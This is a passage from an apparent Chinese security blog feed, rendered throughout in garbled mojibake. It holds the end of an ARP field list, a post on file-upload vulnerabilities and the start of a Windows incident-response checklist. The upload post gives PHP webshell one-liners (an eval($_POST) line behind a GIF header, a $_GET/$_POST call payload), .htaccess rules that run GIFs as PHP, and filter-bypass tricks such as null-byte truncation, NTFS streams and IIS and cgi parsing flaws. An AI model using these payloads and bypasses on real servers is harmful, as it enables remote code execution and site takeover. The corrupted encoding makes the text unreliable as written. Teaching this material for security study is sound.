<li>Source Hardware Addressï¼š  æŒ‡çš„æ˜¯å‘é€ARPæŠ¥æ–‡çš„è®¾å¤‡MACåœ°å€ï¼›</li>
<li>Source Protocol Addressï¼šæŒ‡çš„æ˜¯å‘é€ARPæŠ¥æ–‡çš„è®¾å¤‡IPåœ°å€ï¼›</li>
<li>Destination Hardware Addressï¼šæŒ‡çš„æ˜¯æ¥æ”¶è€…MACåœ°å€ï¼Œåœ¨ARP requestæŠ¥æ–‡ä¸­ï¼Œè¯¥å­—æ®µå€¼ä¸º0ï¼›</li>
<li>8ã€Destination Protocol Addressï¼šæŒ‡çš„æ˜¯æŒ‡æ¥æ”¶è€…çš„IPåœ°å€ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>äº¤æ¢æœº</tag>
        <tag>è·¯ç”±å™¨</tag>
        <tag>ä¸‰å±‚äº¤æ¢æœº</tag>
        <tag>VLAN</tag>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <url>/archives/931c692.html</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><p>è¯¥æ¼æ´çš„äº§ç”Ÿæ—¶å› ä¸ºè½¯ä»¶ç¼–å†™äººå‘˜æ²¡æœ‰å¯¹ç”¨æˆ·çš„ä¸Šä¼ è¡Œä¸ºåšè¿‡æ»¤ï¼Œå¦‚æ²¡æœ‰å¯¹æ–‡ä»¶çš„ä¸Šä¼ ç±»å‹åšé™åˆ¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥ä¸Šä¼ ä»»æ„ç±»å‹çš„æ–‡ä»¶ï¼Œä»è€Œé€ æˆå±å®³ã€‚</p>
<h2 id="è¿‡æ»¤æ–¹æ³•"><a href="#è¿‡æ»¤æ–¹æ³•" class="headerlink" title="è¿‡æ»¤æ–¹æ³•"></a>è¿‡æ»¤æ–¹æ³•</h2><p>å‰ç«¯è¿‡æ»¤</p>
<p>é€šè¿‡jsè¿‡æ»¤æ–‡ä»¶æ‰©å±•åï¼šå¯é€šè¿‡ç¦ç”¨jsï¼ŒæŠ“åŒ…æ”¹åŒ…ã€ä¿®æ”¹æ–‡ä»¶åç¼€åçš„æ–¹å¼ç»•è¿‡ï¼Œé‡å†™å‰ç«¯è¿‡æ»¤å‡½æ•°</p>
<h2 id="åç«¯è¿‡æ»¤"><a href="#åç«¯è¿‡æ»¤" class="headerlink" title="åç«¯è¿‡æ»¤"></a>åç«¯è¿‡æ»¤</h2><p><strong>è¯†åˆ«æ–‡ä»¶æ‰©å±•å</strong>ï¼šåªåœ¨åç«¯æ˜¯åŸºäºé»‘åå•è¿‡æ»¤çš„æ—¶å€™æœ‰æ•ˆã€‚åœ¨appacheä¸­ï¼Œè¯†åˆ«æ–‡ä»¶åçš„æ–¹æ³•æ—¶ä»å³å‘å·¦è¯†åˆ«ï¼Œé‡åˆ°ä¸èƒ½è¯†åˆ«çš„æ‰©å±•åå°±ä¼šè¢«å¿½ç•¥ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„å»ºè¿™æ ·çš„æ‰©å±•åç»•è¿‡ï¼Œ<code>test.php.tar</code> åœ¨apacheçš„é…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªdefaulttypeé€‰é¡¹ï¼Œè¯¥é€‰é¡¹è®¾ç½®äº†å½“æ–‡ä»¶åä¸å¯è¢«è¯†åˆ«çš„æ—¶å€™å¤„ç†è¯¥æ–‡ä»¶çš„ç­–ç•¥ã€‚é»˜è®¤ä¼šè¢«å½“æˆtext&#x2F;plainç±»å‹å¤„ç†ã€‚<del>Apacheè®¤ä¸ºä¸€ä¸ªæ–‡ä»¶å¯ä»¥æ‹¥æœ‰å¤šä¸ªæ‰©å±•åï¼Œå“ªæ€•æ²¡æœ‰æ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥æ‹¥æœ‰å¤šä¸ªæ‰©å±•åã€‚Apacheè®¤ä¸ºåº”è¯¥ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£ææ–¹æ³•çš„ã€‚å¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸ºä¸å¯è¯†åˆ«çš„ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°åˆ¤æ–­åˆ°æ–‡ä»¶åä¸ºæ­¢</del>ã€‚</p>
<p><strong>è¯†åˆ«mimeç±»å‹</strong>ï¼šé€šè¿‡æŠ“åŒ…æ”¹åŒ…è½¯ä»¶è¿‡æ»¤</p>
<p><strong>è¯†åˆ«æ–‡ä»¶å¤´éƒ¨å­—ç¬¦</strong>ï¼šåœ¨æ–‡ä»¶ä¸­æ’å…¥å¯¹åº”æ–‡ä»¶çš„æ ‡å¿—å­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47494638 //gifæ–‡ä»¶å¤´&lt;?php@eval($_POST[123])?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>é€šè¿‡ä¿®æ”¹ä¸­é—´ä»¶é…ç½®æ–‡ä»¶</strong>ï¼Œä½¿å¾—æ–‡ä»¶å­˜å‚¨ç›®å½•å¯¹åº”åç¼€åæ–‡ä»¶åªèƒ½ä»¥ç‰¹å®šçš„æ–¹å¼è¢«è¯»å–</p>
<p><code>AddType text/plain .py .txt .php</code> &#x2F;&#x2F;è¿™æ ·è®¾ç½®phpæ–‡ä»¶å°†è¢«ä½œä¸ºæ–‡æœ¬æ–‡ä»¶çœ‹å¾…ã€‚</p>
<p>ç¦æ­¢æ­¤ç±»æ–‡ä»¶è¢«è®¿é—®</p>
<p><code>Options -ExecCGI AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgiè¯†åˆ«</code></p>
<p>å¼ºåˆ¶webæœåŠ¡å™¨å¯¹äºç‰¹å®šæ–‡ä»¶ç±»å‹çš„å¤„ç†ï¼Œä¸ç¬¬ä¸€æ¡ä¸åŒçš„æ˜¯ï¼Œ ä¸‹é¢çš„æ–¹æ³•ç›´æ¥å¼ºè¡Œè®©apacheå°†æ–‡ä»¶è¯†åˆ«ä¸ºä½ æŒ‡å®šçš„ç±»å‹ï¼Œè€Œç¬¬ä¸€ç§æ˜¯è®©æµè§ˆå™¨ç¬¦åˆä¸Šé¢æ­£åˆ™çš„å…¨éƒ¨è¢«è®¤ä¸ºæ˜¯çº¯æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥ç»§ç»­å¾€é‡Œé¢åŠ å…¥å…¶ä»–ç±»å‹ã€‚</p>
<p><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt; ForceType text/plain &lt;/FilesMatch&gt;</code></p>
<p>åªå…è®¸è®¿é—®ç‰¹å®šç±»å‹çš„æ–‡ä»¶.ä½¿å¾—è¯¥æ–‡ä»¶å¤¹é‡Œé¢åªæœ‰å›¾ç‰‡æ‰©å±•åçš„æ–‡ä»¶æ‰å¯ä»¥è¢«è®¿é—®ï¼Œå…¶ä»–ç±»å‹éƒ½æ˜¯æ‹’ç»è®¿é—®(ç™½åå•ç­–ç•¥)ã€‚</p>
<p><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt; order deny,allow deny from all &lt;/Files&gt;</code></p>
<p>ä¸Šè¿°è¿‡æ»¤ç­–ç•¥å‡å¯é€šè¿‡ä¸Šä¼ .htaccessä¼ªé™æ€æ–‡ä»¶ï¼Œè¢«è¦†ç›–ã€‚ä¼ªé™æ€æ–‡ä»¶è¢«æ‰§è¡Œéœ€è¦è®¾ç½®äº†<code>allowoverride</code> åœ¨è¯¥æ–‡ä»¶ä¸­å†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;AddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåªé’ˆå¯¹gifæ–‡ä»¶ä¼šè§£ææˆPhpä»£ç æ‰§è¡ŒSetHandler application/x-httpd-php    #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£ææˆphpä»£ç æ‰§è¡Œ&lt;/IfModule&gt;æˆ–è€…&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡ŒAddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ&lt;/FilesMatch&gt;æˆ–è€…&lt;IfModule mime_module&gt;AddType application/x-httpd-php .gif&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç³»ç»Ÿæˆªæ–­</strong>ï¼Œå½“æ–‡ä»¶ç³»ç»Ÿé‡åˆ°0x00çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸï¼Œè¿™æ ·æˆ‘ä¹ˆå¯ä»¥è¿™æ ·æ„é€ æ‰©å±•åa.php%00jpgã€‚å½“æ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶çš„æ—¶å€™é‡åˆ°%00çš„æ—¶å€™ä¼šè®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸï¼Œ<code>ä½†å¦‚æœè¿‡æ»¤ç³»ç»Ÿåªæ˜¯ç®€å•å¾—åˆ¤æ–­åç¼€åæ˜¯ä¸æ˜¯phpçš„è¯ï¼Œä»–å¾—åˆ°çš„æ˜¯php%jpgè¿™å½“ç„¶ä¸æ˜¯php,æ‰€ä»¥æˆåŠŸé€šè¿‡</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªa.phpçš„æ–‡ä»¶ã€‚</p>
<p>**åˆ©ç”¨ntfsæ–‡ä»¶ç³»ç»Ÿçš„adsç‰¹æ€§ï¼š**æ„é€ è¿™æ ·ä¸€ä¸ªæ–‡ä»¶åa.php::<em>DATA</em>ï¼Œ<em>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­</em>ï¼Œ<em>åç¼€åæ˜æ˜¾ä¸æ˜¯php</em>ï¼Œ<em>é‚£ä¹ˆé’ˆå¯¹åç¼€åæ£€æµ‹å°±å¤±æ•ˆäº†</em>ï¼Œ<em>ä½†æ˜¯ntfsæ–‡ä»¶ç³»ç»Ÿå´èƒ½è¯†åˆ«è¿™ç§æ ¼å¼</em>ï¼Œ<em>å…¶ä¸­</em>DATAè¡¨ç¤ºè¯¥adsæµæ˜¯ä¸€ä¸ªæ–‡ä»¶æµï¼Œä½†æ˜¯å› ä¸ºæµåä¸ºç©ºï¼Œå³è¯¥å®¿ä¸»æ–‡ä»¶å¹¶æ²¡æœ‰æŒ‚ç€ä¸€ä¸ªadsæµæ–‡ä»¶ï¼Œé‚£ä¹ˆntfsæ–‡ä»¶ç³»ç»Ÿè®²æ‰§è¡Œå®¿ä¸»æ–‡ä»¶ï¼Œå¦‚æœæµåä¸ä¸ºç©ºåˆ™ä¼šæ‰§è¡Œå¯„å®¿æ–‡ä»¶ã€‚</p>
<p><strong>ä½¿ç”¨å¤§å°å†™ç»•è¿‡</strong></p>
<p><code>PHP/PhP</code></p>
<p><strong>ä½¿ç”¨å¦ç±»æ‰©å±•å</strong></p>
<p><code>php2/php3/php4/php5/php /php./php../pht/phtml</code></p>
<p><strong>åç¼€å†—ä½™</strong></p>
<p><code>æ·»åŠ å¦‚%81è¿™ç±»çš„éæ³•æ–‡ä»¶ååˆ°æ–‡ä»¶æœ«å°¾</code> a.php%81</p>
<p><strong>åŒå†™ç»•è¿‡</strong></p>
<p><code>phphpp</code> è¯¥å¤„æ¶‰åŠå¯¹æ–¹æ›¿æ¢çš„æ—¶å€™ï¼Œæ˜¯ä»å‰å¾€åè¿˜æ˜¯ä»åå¾€å‰è¯†åˆ«çš„<code>pphphp</code> ä¸<code>phphpp</code> æ˜¯ä¸¤ç§å®Œå…¨ä¸åŒçš„æƒ…å†µ</p>
<p><strong>äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</strong></p>
<p>æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¤šæ—¶å€™éƒ½ä¼šè¢«äºŒæ¬¡æ¸²æŸ“å¹¶å­˜å‚¨åˆ°åˆ«çš„ä½ç½®ï¼Œåœ¨è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œç”šè‡³ä¼šå»æ‰å…¶ä¸­çš„å†—ä½™éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é™„åŠ çš„ä¸€å¥è¯æœ¨é©¬éƒ¨åˆ†ï¼Œè¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨å·¥å…·å¯¹æ¯”åŸå›¾ç‰‡äºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­ç›¸åŒçš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰è¢«æ”¹å˜çš„éƒ¨åˆ†ï¼Œåœ¨è¿™éƒ¨åˆ†éƒ¨åˆ†æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç»•è¿‡è¯¥é™åˆ¶å¦‚<code>winhexå’Œ010editor</code></p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled.png</p>
<blockquote>
<p>é’ˆå¯¹GIFæ–‡ä»¶</p>
</blockquote>
<p>ç›´æ¥ä½¿ç”¨010editeræ¯”è¾ƒä¸¤æ¬¡ä¸Šä¼ æ–‡ä»¶åŒºåˆ«ï¼Œåœ¨ç›¸åŒéƒ¨åˆ†æ’å…¥ä»£ç å°±å¯ä»¥äº†</p>
<blockquote>
<p>é’ˆå¯¹PNGæ–‡ä»¶</p>
</blockquote>
<p>ç›´æ¥åƒä¿®æ”¹gifæ–‡ä»¶é‚£æ ·å·²ç»è¡Œä¸é€šäº†ï¼Œéœ€è¦å°†ä»£ç å†™å…¥çš„PLETæ•°æ®å—æˆ–è€…IDATæ•°æ®å¼€ä¸­</p>
<p><strong>å†™å…¥åˆ°PLETæ•°æ®å—ä¸­</strong></p>
<p>ä½¿ç”¨ç´¢å¼•å›¾åƒæ‰èƒ½å†™å…¥æˆåŠŸï¼Œæ‰€ä»¥éœ€è¦åœ¨psä¸­æ”¹ä¸€ä¸‹å›¾ç‰‡çš„å›¾åƒæ¨¡å¼ã€‚ä¸ºç´¢å¼•é¢œè‰²</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%201.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%201.png</p>
<p>è¿™æ ·ä¿®æ”¹ä¹‹åï¼Œä½¿ç”¨è„šæœ¬å·¥å…·å°†è„šæœ¬å†™åˆ°å›¾ç‰‡ä¸­ï¼Œè¿™æ—¶å€™å†ä¸Šä¼ å¯èƒ½è¿˜æ˜¯ä¼šå¤±è´¥</p>
<p><a href="jpg_secong_render_PLET.py">jpg_secong_render_PLET.py</a></p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%202.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%202.png</p>
<p>å°è¯•å†æ¬¡ä¸Šä¼ æ¸²æŸ“</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%203.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%203.png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆåŠŸ~~~~~</span><br></pre></td></tr></table></figure>

<p><strong>å†™å…¥åˆ°IDATæ•°æ®å—</strong></p>
<p>ç›´æ¥è·‘è„šæœ¬</p>
<p><a href="jpg_second_render.php">png_second_render.php</a></p>
<blockquote>
<p>é’ˆå¯¹jpgæ–‡ä»¶</p>
</blockquote>
<p>ç›´æ¥ä¸Šè„šæœ¬</p>
<p><a href="jpg_secong_render_PLET%201.py">jpg_secong_render_PLET.py</a></p>
<p><a href="jpg_payload.php">jpg_payload.php</a></p>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ol>
<li>éœ€è¦è¢« imagecreatefromjpeg æ¸²æŸ“æˆ–å†ç”¨å·¥å…·</li>
<li>å›¾ç‰‡æ‰¾çš„ç¨å¾®å¤§ä¸€ç‚¹ æˆåŠŸç‡æ›´é«˜</li>
<li>Payload è¯­å¥è¶ŠçŸ­æˆåŠŸç‡è¶Šé«˜</li>
<li>ä¸€å¼ å›¾ç‰‡ä¸è¡Œå°±æ¢ä¸€å¼  ä¸è¦æ­»ç£•</li>
<li>å›½å…‰è¡¥å……ï¼šè²Œä¼¼ç™½è‰²çš„å›¾ç‰‡æˆåŠŸç‡ä¹Ÿæ¯”è¾ƒé«˜</li>
<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code>Â è¿™ç§payload æˆåŠŸç‡å¾ˆé«˜</li>
</ol>
<p><strong>æ¡ä»¶ç«äº‰â€”å¹¶å‘æ¼æ´</strong></p>
<p>æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚åœ¨è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“çš„è¿‡ç¨‹ä¸­å¯èƒ½å­˜åœ¨è¯¥æ¥¼å“¦ä¸œ</p>
<p>è¯¥æ¼æ´ä¸€èˆ¬å‡ºç°åœ¨ä¸æ•°æ®åº“ç³»ç»Ÿé¢‘ç¹äº¤äº’çš„ä½ç½®ï¼Œä¾‹å¦‚é‡‘é¢åŒæ­¥ã€æ”¯ä»˜ç­‰è¾ƒæ•æ„Ÿæ“ä½œå¤„ã€‚å¦å¤–æ¡ä»¶ç«äº‰æ¼æ´ä¹Ÿä¼šå‡ºç°åœ¨å…¶ä»–ä½ç½®ï¼Œä¾‹å¦‚æ–‡ä»¶çš„æ“ä½œå¤„ç†ç­‰ã€‚</p>
<p><strong>æ–‡ä»¶è§£ææ¼æ´</strong></p>
<p>å†iisä¸­å¦‚æœä¸Šä¼ *.asp;1.jpgçš„æ–‡ä»¶ï¼Œiisä¼šå°†è¯¥æ–‡ä»¶å½“ä½œaspæ–‡ä»¶è§£æï¼›å°†*.asp&#x2F;ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¼šè¢«å½“æˆaspè§£æï¼›é»˜è®¤ä¼šå°†æ‰©å±•åä¸º.asaï¼Œ.cdxï¼Œ.cerè§£æä¸ºasp</p>
<p>åœ¨åç«¯å¼€å¯äº†cgiçš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚è¿™æ ·çš„åœ°å€<code>http://www.armandhe.com/a.jpg/a.php</code> å…¶ä¸­a.jpgæ˜¯æˆ‘ä»¬è¯·æ±‚çš„çœŸå®æ–‡ä»¶ï¼Œa.phpæ˜¯ä¸å­˜åœ¨çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ä»»æ„å®šä¹‰ï¼Œæ­¤æ—¶a.jpgæ–‡ä»¶ä¼šè¢«å½“ä½œæ˜¯phpæ–‡ä»¶å»è§£ææ‰§è¡Œã€‚</p>
<p><code>å¯¹äºä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ /xxx.phpï¼ˆxxxä¸ºä»»æ„å­—ç¬¦ï¼‰å,å³å¯å°†æ–‡ä»¶ä½œä¸ºphpè§£æã€‚ ä¾‹ï¼šinfo.jpgåé¢åŠ ä¸Š/xxx.phpï¼Œä¼šå°†info.jpg ä»¥phpè§£æã€‚</code></p>
<p><code>phpçš„ä¸€ä¸ªé€‰é¡¹ï¼šcgi.fix_pathinfoï¼Œè¯¥é€‰é¡¹é»˜è®¤å¼€å¯ï¼Œå€¼ä¸º1ï¼Œç”¨äºä¿®ç†è·¯å¾„ï¼Œ ä¾‹å¦‚ï¼šå½“phpé‡åˆ°æ–‡ä»¶è·¯å¾„&quot;/info.jpg/xxx.php/lxh.sec&quot;æ—¶ è‹¥&quot;/info.jpg/xxx.php/lxh.sec&quot;ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„&quot;/lxh.sec&quot;ï¼Œç„¶ååˆ¤æ–­&quot;/info.jpg/xxx.php&quot;æ˜¯å¦å­˜åœ¨ è‹¥å­˜åœ¨åˆ™å°†/info.jpg/xxx.phpï¼Œå½“ä½œæ–‡ä»¶/info.jpg/xxx.php/lxh.sec è‹¥/info.jpg/xxx.phpä»ä¸å­˜åœ¨ï¼Œåˆ™ç»§ç»­å»æ‰xxx.php,ä¾æ­¤ç±»æ¨ã€‚</code></p>
<p><strong>addhandleræ¼æ´ ï¼šAddHandler application&#x2F;x-httpd-php .jpg</strong></p>
<p>å¦‚æœè¿™æ ·è®¾ç½®ï¼Œæ‰€æœ‰æ–‡ä»¶åä¸­å«æœ‰.phpçš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p>
<p>**æ¢è¡Œæ¼æ´ï¼š**phpä¸­çš„$ä¿®é¥°ä¸ä»…å¯ä»¥åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œè€Œä¸”å¯ä»¥åŒ¹é…æ‰€ä»¥è¿™æ ·çš„æ–‡ä»¶åæ˜¯å¯ä»¥çš„1.php0Aï¼Œå¦‚æ­¤çš„è¯å°±å¯ä»¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚</p>
<p><strong>.&#x2F; :ä½¿ç”¨move_upload_fileçš„æ—¶å€™ï¼Œå½“æ–‡ä»¶å­˜å‚¨çš„è·¯å¾„å¯æ§çš„æ—¶å€™ï¼Œè·¯å¾„åé¢çš„&#x2F;.ä¼šè¢«å¿½ç•¥ï¼Œå³<code>hack.php/.</code></strong></p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>åº”æ€¥å“åº”</title>
    <url>/archives/587e8742.html</url>
    <content><![CDATA[<h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="å…¥ä¾µæ£€æµ‹"><a href="#å…¥ä¾µæ£€æµ‹" class="headerlink" title="å…¥ä¾µæ£€æµ‹"></a>å…¥ä¾µæ£€æµ‹</h2><h3 id="ç³»ç»Ÿè´¦æˆ·ç›¸å…³"><a href="#ç³»ç»Ÿè´¦æˆ·ç›¸å…³" class="headerlink" title="ç³»ç»Ÿè´¦æˆ·ç›¸å…³"></a>ç³»ç»Ÿè´¦æˆ·ç›¸å…³</h3><ul>
<li>æŸ¥çœ‹ç”¨æˆ· net user</li>
<li>lusrmgr.exe æ— æ³•æŸ¥çœ‹é€šè¿‡æ³¨å†Œè¡¨æ–¹å¼å¢åŠ çš„ç”¨æˆ·</li>
<li>æ³¨å†Œè¡¨æŸ¥çœ‹ HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</li>
<li>æ‰“å¼€äº‹ä»¶ç›‘å¬å™¨æŸ¥çœ‹ç™»å½•æ—¥å¿— eventvwr.msc</li>
</ul>
<h3 id="è¿›ç¨‹ã€ç«¯å£ç›¸å…³"><a href="#è¿›ç¨‹ã€ç«¯å£ç›¸å…³" class="headerlink" title="è¿›ç¨‹ã€ç«¯å£ç›¸å…³"></a>è¿›ç¨‹ã€ç«¯å£ç›¸å…³</h3><ul>
<li>netstat -ano</li>
<li>netstat -ano | findstr estab</li>
<li>netstat -rn æŸ¥çœ‹è·¯ç”±</li>
<li>msinfo32 æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</li>
<li>tasklist æ˜¾ç¤ºè¿›ç¨‹</li>
<li>tasklist &#x2F;f &#x2F;pid 123 &#x2F;t æ€æ­»è¿›ç¨‹</li>
<li>tastlist &#x2F;f &#x2F;im explorer.exe &#x2F;t æ€æ­»è¿›ç¨‹</li>
<li>æŸ¥çœ‹è¿›ç¨‹æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶  wmic       process</li>
<li>tasklist &#x2F;svcæ˜¾ç¤ºè¿›ç¨‹ pid æœåŠ¡</li>
<li>netsh firewall show all æŸ¥çœ‹é˜²ç«å¢™ç›¸å…³</li>
</ul>
<h2 id="å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡"><a href="#å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡" class="headerlink" title="å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡"></a>å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡</h2><ul>
<li>C:\Users\xxxx\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup å¼€æœºå¯åŠ¨é¡¹è·¯å¾„</li>
<li>mscofig ç³»ç»Ÿé…ç½®çš„å¯åŠ¨é¡¹</li>
<li>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce æ³¨å†Œè¡¨å¯åŠ¨é¡¹</li>
<li>gpedit.msc æŸ¥çœ‹å¯åŠ¨è„šæœ¬</li>
<li>services.msc æŸ¥çœ‹æœåŠ¡</li>
<li>systeminfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</li>
<li>%userprofile%\recent æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶</li>
<li>æŸ¥çœ‹å›æ”¶ç«™ï¼Œæµè§ˆå™¨ä¸‹è½½è®°å½•ï¼Œå†å²è®°å½• æŸ¥çœ‹ä¿®æ”¹æ—¶é—´åœ¨åˆ›å»ºæ—¶é—´ä¹‹å‰çš„æ–‡ä»¶</li>
</ul>
<h2 id="å†…å­˜ç›¸å…³"><a href="#å†…å­˜ç›¸å…³" class="headerlink" title="å†…å­˜ç›¸å…³"></a>å†…å­˜ç›¸å…³</h2><ul>
<li>NotMyFault64.exe &#x2F;crash ç”Ÿæˆçš„æ–‡ä»¶åœ¨%systemroot%\memory.dmp å†…å­˜è½¬å‚¨</li>
</ul>
<h1 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h1><h2 id="æ—¥å¿—è®°å½•"><a href="#æ—¥å¿—è®°å½•" class="headerlink" title="æ—¥å¿—è®°å½•"></a>æ—¥å¿—è®°å½•</h2><p><code>window   %systemroot%\system32\winevt\logs\</code></p>
